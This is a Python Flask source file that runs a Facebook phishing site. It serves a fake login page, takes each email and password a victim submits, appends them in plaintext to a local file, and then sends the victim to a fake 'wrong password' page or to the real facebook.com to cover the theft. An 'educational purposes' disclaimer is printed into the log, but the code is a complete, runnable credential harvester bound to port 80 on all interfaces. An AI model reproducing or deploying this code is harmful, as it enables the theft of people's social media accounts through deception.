from flask import Flask, render_template, request, redirect
# from email.mime import message, image, text, multipart, nonmultipart, base, audio

app = Flask(__name__)


def save_data(template, email, password, func):
    file = open("fun.txt", "a")
    file.write("This is only for educational purposes.\n"
               "So that you will come to know how hackers\n"
               "can hack your facebook account with just simple steps.\n"
               "So be careful with your work and I will not be responsible for any damage caused by you.\n")
    file.write(
        "---------------Created By Shail---------------\n\n{0}, {1}\n\n".format(email, password))
    file.close()
    return func(template)


@app.route("/")
def facebook():
    return render_template("index.html")


@app.route("/wrong_password", methods=["POST", "GET"])
def wrong_password():
    if request.method == "POST":
        email, password = request.form["email"], request.form["password"]
        return save_data("wrong_password.html", email, password, render_template)
    else:
        return render_template("index.html")


@app.route("/facebook", methods=["POST", "GET"])
def facebook_orignal():
    if request.method == "POST":
        email, password = request.form["email"], request.form["password"]
        return save_data("https://www.facebook.com", email, password, redirect)
    else:
        return render_template("wrong_password.html")


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=80)
